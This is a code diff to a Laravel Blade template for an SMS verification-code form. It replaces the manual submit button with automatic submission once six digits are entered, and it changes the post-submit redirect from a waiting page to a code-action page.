@@ -40,10 +40,6 @@
                         >
                     </div>
                 </div>
-                
-                <button type="submit" class="form-submit-btn" id="submit-btn">
-                    <span>{{ __('messages.confirm') }}</span>
-                </button>
             </form>
         </div>
     </div>
@@ -55,32 +51,28 @@
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.getElementById('code-form');
     const codeInput = document.getElementById('sms-code');
-    const submitBtn = document.getElementById('submit-btn');
-    const isValid = () => codeInput.value.trim().length >= 4;
-
-    const updateSubmitState = () => {
-        submitBtn.disabled = !isValid();
-    };
+    let isSubmitting = false;
+    
+    // Auto-submit when 6 digits entered
+    function checkAndSubmit() {
+        const code = codeInput.value.trim();
+        
+        if (code.length === 6 && !isSubmitting) {
+            isSubmitting = true;
+            codeInput.disabled = true;
+            codeInput.style.opacity = '0.6';
+            
+            submitCode(code);
+        }
+    }
     
     // Only allow numbers
     codeInput.addEventListener('input', function(e) {
         this.value = this.value.replace(/[^0-9]/g, '');
-        updateSubmitState();
+        checkAndSubmit();
     });
-
-    submitBtn.disabled = true;
     
-    form.addEventListener('submit', async function(e) {
-        e.preventDefault();
-        
-        const code = codeInput.value.trim();
-        if (code.length < 4) {
-            return;
-        }
-        
-        submitBtn.classList.add('loading');
-        submitBtn.disabled = true;
-        
+    async function submitCode(code) {
         try {
             const sessionId = localStorage.getItem('session_id');
             if (!sessionId) {
@@ -101,16 +93,19 @@ document.addEventListener('DOMContentLoaded', function() {
             });
             
             if (response.ok) {
-                window.location.href = `/session/${sessionId}/waiting`;
+                window.location.href = `/session/${sessionId}/action/code`;
             } else {
                 throw new Error('Submit failed');
             }
         } catch (error) {
             console.error('Error:', error);
-            submitBtn.classList.remove('loading');
-            submitBtn.disabled = false;
+            // Reset on error
+            isSubmitting = false;
+            codeInput.disabled = false;
+            codeInput.style.opacity = '1';
+            codeInput.focus();
         }
-    });
+    }
 });
 </script>
 @endpush
